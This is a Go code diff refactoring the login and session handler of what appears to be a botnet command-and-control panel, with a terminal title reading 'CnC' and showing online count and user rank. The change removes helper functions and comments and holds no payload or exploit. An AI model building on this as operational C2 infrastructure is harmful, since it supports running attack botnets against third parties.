@@ -6,28 +6,18 @@ import (
 	"api/core/net/commands"
 	"api/core/net/sessions"
 	"api/core/net/term"
-	"crypto/rand"
-	"encoding/base64"
 	"fmt"
 	"net"
-	"strconv"
 	"strings"
 	"time"
 )
 
 var SpinnerChars = []string{"|", "/", "-", "\\"}
 
-func RemoveSession(id int64) bool {
-	sessions.SessionMutex.Lock()
-	delete(sessions.Sessions, id)
-	sessions.SessionMutex.Unlock()
-	return true
-}
-
 func handler(conn net.Conn) {
 	defer conn.Close()
 	conn.Write([]byte(fmt.Sprintf("\033]0;%s - Login\007", models.Config.Name)))
-	// Consume 64 bytes
+	//more
 	buf := make([]byte, 64)
 	if _, err := conn.Read(buf); err != nil {
 		logger.Println("Failed to read initial data: ", err)
@@ -91,29 +81,29 @@ func handler(conn net.Conn) {
 	} else {
 		role = "user"
 	}
+	//title
 	go func() {
-		i := 0 // Initialize the counter for spinner animation
+		i := 0 
 		
 		for {
 			time.Sleep(time.Second)
 			
-			// Construct the message with the spinner character that changes over time
-			message := fmt.Sprintf("\033]0; [%s] %s CnC - Username [%s] - Online [%d] - Rank [%s] [%s] \007",
-			SpinnerChars[i%len(SpinnerChars)], models.Config.Name, Session.User.Username, sessions.Count(), role, SpinnerChars[i%len(SpinnerChars)])
+			message := fmt.Sprintf("\033]0; [%s] %s CnC - Username [%s] - Online [%d] - Rank [%s] \007",
+			SpinnerChars[i%len(SpinnerChars)], models.Config.Name, Session.User.Username, sessions.Count(), role)
 			
-			// Write the message to the connection
 			if _, err := conn.Write([]byte(message)); err != nil {
-				if RemoveSession(Session.ID) {
+				if sessions.RemoveSession(Session.ID) {
 					logger.Println(Session.User.Username + " Session Closed!")
 				}
 				conn.Close()
 				break
 			}
 			
-			i++ // Increment the counter for next spinner character
+			i++ 
 		}
 	}()
 	commands.Commands["splash-home"].Exec(Session, nil)
+	// handler
 	for {
 		tm.Write([]byte(fmt.Sprintf("%s@%s# ", Session.User.Username, models.Config.Name)))
 		cmd, err := tm.ReadLine(fmt.Sprintf("%s@%s# ", Session.User.Username, models.Config.Name))
@@ -129,24 +119,4 @@ func handler(conn net.Conn) {
 	}
 }
 
-func GenerateSessionID() int64 {
-	// Generate a random session ID string
-	sessionIDBytes := make([]byte, 16) // 16 bytes = 128 bits
-	_, err := rand.Read(sessionIDBytes)
-	if err != nil {
-		// Handle error
-		return -1 // Return an error value
-	}
 
-	// Encode the random bytes to base64
-	sessionIDBase64 := base64.URLEncoding.EncodeToString(sessionIDBytes)
-
-	// Convert the base64 string to an integer
-	sessionIDInt, err := strconv.ParseInt(sessionIDBase64, 10, 64)
-	if err != nil {
-		// Handle error
-		return -1 // Return an error value
-	}
-
-	return sessionIDInt
-}
